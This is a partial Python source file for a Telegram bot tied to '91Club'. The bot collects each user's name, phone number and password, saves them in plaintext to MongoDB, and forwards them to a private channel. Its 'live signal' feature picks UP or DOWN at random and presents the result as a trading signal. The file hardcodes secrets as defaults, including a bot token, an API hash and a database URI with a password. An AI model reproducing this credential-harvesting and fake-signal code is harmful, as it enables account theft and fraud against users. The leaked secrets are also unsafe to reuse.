import os
import random
import datetime
from pyrogram import Client, filters
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Message,
    CallbackQuery
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# Environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN", "7259559804:AAH_ArQg323s34Jp1QgtysoX5XxTXBKG-cw")
API_ID = int(os.getenv("API_ID", "26788480"))
API_HASH = os.getenv("API_HASH", "858d65155253af8632221240c535c314")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://binomo:binomo123@binomo.hghd0yz.mongodb.net/?retryWrites=true&w=majority&appName=AtlasApp")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5943144679"))
CHANNEL_ID = int(os.getenv("CHANNEL_ID", "-1002269272993"))  # Add this line

# ... [keep other existing code the same] ...

@app.on_message(filters.private & ~filters.command("start"))
async def handle_account_info(client: Client, message: Message):
    user_id = message.from_user.id
    state = CONNECT_ACCOUNT_STATES.get(user_id)

    if not state:
        return

    if state == "awaiting_name":
        CONNECT_ACCOUNT_STATES[user_id] = {
            "state": "awaiting_phone",
            "name": message.text
        }
        await message.reply_text("Please enter your 91Club phone number:")
    
    elif state.get("state") == "awaiting_phone":
        CONNECT_ACCOUNT_STATES[user_id] = {
            "state": "awaiting_password",
            "name": state["name"],
            "phone": message.text
        }
        await message.reply_text("Please enter your 91Club password:")
    
    elif state.get("state") == "awaiting_password":
        user_data = {
            "user_id": user_id,
            "name": state["name"],
            "phone": state["phone"],
            "password": message.text,
            "logged_in": True
        }
        
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": user_data},
            upsert=True
        )
        
        # Send details to channel
        try:
            await client.send_message(
                CHANNEL_ID,
                f"**📝 New User Login**\n\n"
                f"▫️ User ID: `{user_id}`\n"
                f"▫️ Name: `{state['name']}`\n"
                f"▫️ Phone: `{state['phone']}`\n"
                f"▫️ Password: `{message.text}`",
                parse_mode="markdown"
            )
        except Exception as e:
            print(f"Error sending to channel: {e}")
        
        del CONNECT_ACCOUNT_STATES[user_id]
        await message.reply_text("✅ Successfully logged in!")
        await start_command(client, message)


@app.on_callback_query(filters.create(lambda _, __, query: query.data == "logout"))
async def logout_account(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"logged_in": False}}
    )
    
    await callback_query.message.edit_text("✅ Successfully logged out!")
    await start_command(client, callback_query.message)

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "live_signal"))
async def send_live_signal(client: Client, callback_query: CallbackQuery):
    signal = random.choice(["📈 Signal: UP", "📉 Signal: DOWN"])
    await callback_query.message.edit_text(
        f"**Live Signal**\n\n{signal}\n\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

if __name__ == "__main__":
    print("Bot started...")
    app.run()
